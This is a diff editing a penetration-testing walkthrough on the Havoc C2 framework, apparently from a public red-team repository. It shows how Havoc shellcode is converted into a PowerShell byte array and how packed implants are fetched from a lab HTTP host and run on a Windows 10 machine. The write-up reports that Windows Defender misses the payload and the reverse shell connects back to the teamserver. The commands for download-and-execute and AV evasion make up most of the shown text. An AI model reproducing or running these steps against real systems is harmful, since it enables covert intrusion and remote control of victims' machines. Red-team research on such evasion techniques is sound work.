@@ -273,25 +273,16 @@ Preparing the shellcode in the format "PS1" to be able to use my shellcode loade
 => https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/PowerShellTools
 
 Step 1 - Format the shellcode using xxd and sed
-
+-------
 => jeff@kali:~/Documents/Tools/HavocC2$ xxd -p HavocShellcode.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > HavocShellcodeps1.bin
 
 Step 2: Remove the tailing comma “,” at the end of the payload 
-
+-------
 Step 3: Add "[Byte[]] $buf =" at the beginning of the shellcode
-
-jeff@kali:~/Documents/Tools/HavocC2$ ls -al
-total 548
-drwxr-xr-x  3 jeff jeff   4096 Jan 16 19:53 .
-drwxr-xr-x 54 jeff jeff   4096 Jan 15 01:43 ..
-drwxr-xr-x  7 jeff jeff   4096 Jan 15 02:11 Havoc
--rw-r--r--  1 jeff jeff  65536 Jan 16 19:44 Havocdemon2.exe
--rw-r--r--  1 jeff jeff  65536 Jan 16 01:08 Havocdemon.exe
--rw-r--r--  1 jeff jeff  66559 Jan 16 19:46 HavocShellcode.bin                                                                                             
--rw-r--r--  1 jeff jeff 332795 Jan 16 19:51 HavocShellcodeps1.bin                                                                                          
--rw-r--r--  1 jeff jeff  10424 Jan 16 19:53 notes.txt
+-------
 
 jeff@kali:~/Documents/Tools/HavocC2$ cat HavocShellcodeps1.bin
+
 [Byte[]] $buf = 0x56,0x48,0x89,0xe6,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x00,0x00,0x00,0x48,0x89,0xf4,<SNIP>
 
 
@@ -299,9 +290,9 @@ jeff@kali:~/Documents/Tools/HavocC2$ cat HavocShellcodeps1.bin
 PoC - Step 5 - Generate a packed version of the HAVOC implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
 
---------------------------------------
+------------------------------------------
 Example 1 - HAVOC - Windows Exe file
---------------------------------------
+------------------------------------------
 The HAVOC demaons/implants generated with the Windows format ".exe" are easily detected by AV solution such as WIndows Defender. 
 However, multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (Please refer to: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
 
@@ -318,9 +309,9 @@ PS C:\Users\Administrator\Downloads> wget -URI http://192.168.56.104:8080/Packed
 PS C:\Users\Administrator\Downloads> .\PackedHavocRevShell.exe
 
 
---------------------------------------
+------------------------------------------
 Example 2 - HAVOC - Windows Shellcode 
---------------------------------------
+------------------------------------------
 
 PS C:\temp> Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
   ___     ___ _  _     ___ _        _ _  ___         _     _                _        ___
@@ -368,6 +359,14 @@ PS C:\temp> Invoke-PoSH-ShellCodeLoader2 -FileUrl http://192.168.56.104:8080/Hav
 [+] Done!
 
 PS C:\temp> . .\PackedHavocShellcode.ps1
+
+Unhandled Exception: System.AccessViolationException: Attempted to read or write protected memory. This is often an indication that other memory is corrupt.
+   at CallSite.Target(Closure , CallSite , Object , Object , IntPtr , Int32 , Object , Int32 , IntPtr )
+   at System.Dynamic.UpdateDelegates.UpdateAndExecute7[T0,T1,T2,T3,T4,T5,T6,TRet](CallSite site, T0 arg0, T1 arg1, T2 arg2, T3 arg3, T4 arg4, T5 arg5, T6 arg6)
+   at System.Management.Automation.Interpreter.DynamicInstruction`8.Run(InterpretedFrame frame)
+<SNIP>
+
+=> An error message is displayed but the shellcode is executed without being detected by Windows Defender and the Havoc reverse shell connects back to the teamserver.
 
 
 ==============================================================================================================================================
